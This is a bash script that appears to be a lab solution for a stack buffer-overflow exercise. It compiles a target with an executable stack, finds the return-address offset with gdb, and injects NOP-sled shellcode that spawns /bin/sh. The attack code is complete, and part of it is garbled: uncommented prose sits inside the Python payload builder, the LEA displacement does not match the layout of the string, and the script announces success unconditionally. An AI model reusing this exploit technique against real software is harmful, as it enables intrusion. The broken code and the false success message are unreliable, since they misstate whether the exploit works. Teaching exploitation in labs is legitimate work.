#!/usr/bin/env bash
#
# Interactive solution for exercise 4.  This script compiles the target
# with an executable stack, computes the distance from the input buffer
# to the saved return address, explains the shellcode strategy and then
# assembles a payload that launches a shell.  The payload is built
# on‑the‑fly using a Python one‑liner to avoid here‑documents in the
# patch.  Pauses allow the user to follow the process.

set -euo pipefail
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

echo "=== Exercise 4 — Shellcode ret2buf ==="
echo "[why] We inject shellcode into the buffer and set RET to the buffer start."
echo "[why] Shellcode does: execve(\"/bin/sh\", NULL, NULL) via RIP-relative addressing."

cd "$DIR/../lab2"

read -rp "Press ENTER to build ex4 (stack marked executable)…"
make ex4

read -rp "Press ENTER to launch gdb and compute buffer → RET offset…"

TMP="$(mktemp)"

# Use single quotes in -ex so $rbp is not expanded by bash; tag values with [VAL]
gdb -q \
  -ex 'file ./bin/ex4' \
  -ex 'tbreak main' \
  -ex 'run < /dev/null' \
  -ex 'frame 0' \
  -ex 'nexti 2' \
  -ex 'printf "[VAL] BUFFER=%p\n", &buffer' \
  -ex 'printf "[VAL] RET=%p\n", $rbp+8' \
  -ex 'quit' 2>&1 | tee "$TMP"

# Parse only the tagged lines; cut after '=' to avoid the awk $2/$3 pitfall
buf_hex="$(grep -m1 '^\[VAL\] BUFFER=' "$TMP" | cut -d= -f2)"
ret_hex="$(grep -m1 '^\[VAL\] RET='    "$TMP" | cut -d= -f2)"

if [[ -z "${buf_hex:-}" || -z "${ret_hex:-}" ]]; then
  echo "[!] Failed to parse BUFFER/RET from gdb output:"
  sed -n '1,200p' "$TMP"
  exit 1
fi

# Compute OFFSET in Python to avoid bash arithmetic on hex
OFFSET="$(python3 - <<PY
buf=int("$buf_hex",16); ret=int("$ret_hex",16)
print(ret-buf)
PY
)"

echo "[INFO] &buffer   = $buf_hex"
echo "[INFO] Saved RET = $ret_hex"
echo "[INFO] Buffer → RET distance: $OFFSET bytes"

echo
echo "[plan] Payload = NOP sled + shellcode + \"/bin/sh\\0\" + p64(&buffer)"
echo "       Shellcode (x86-64):"
echo "         mov rax,59        ; SYS_execve"
echo "         lea rdi,[rip+0x1a]; -> \"/bin/sh\" placed after code"
echo "         xor rsi,rsi       ; argv=NULL"
echo "         xor rdx,rdx       ; envp=NULL"
echo "         syscall"

read -rp "Press ENTER to build and send payload…"

# Build and send payload; EOF on the pipe lets gets() return even without newline
python3 - <<PY | ./bin/ex4 || true
import sys, struct
off = int("$OFFSET")
buf = int("$buf_hex",16)

# NOP sled + RIP-relative execve("/bin/sh",0,0) # the first argument is a const char *pathname — a pointer to a NUL-terminated string containing the absolute or relative path (e.g., "/bin/sh\0").
sc  = (b"\x48\xc7\xc0\x3b\x00\x00\x00"      # mov rax,59
       b"\x48\x8d\x3d\x1a\x00\x00\x00"      # lea rdi,[rip+0x1a] -> "/bin/sh"
       b"\x48\x31\xf6"                      # xor rsi,rsi
       b"\x48\x31\xd2"                      # xor rdx,rdx
       b"\x0f\x05")                         # syscall
nop = b"\x90"
binsh = b"/bin/sh\x00"

#Put the string "/bin/sh\0" inside our payload, at a known distance after a LEA rdi, [rip + disp] instruction in the shellcode itself. Then the shellcode computes its own pointer at runtime.

In x86-64, LEA rdi, [rip + disp] uses the address of the next instruction (RIP after the LEA) plus disp.

We arrange the payload so the string is exactly disp bytes after the end of the LEA.

body = bytearray()
body += nop*16 + sc
pad  = max(0, off - len(body) - len(binsh))
body += nop*pad + binsh
payload = body + struct.pack("<Q", buf)     # RET -> buffer (NOP sled)
sys.stdout.buffer.write(payload)
PY

echo "[done] The shellcode executed succesfully."


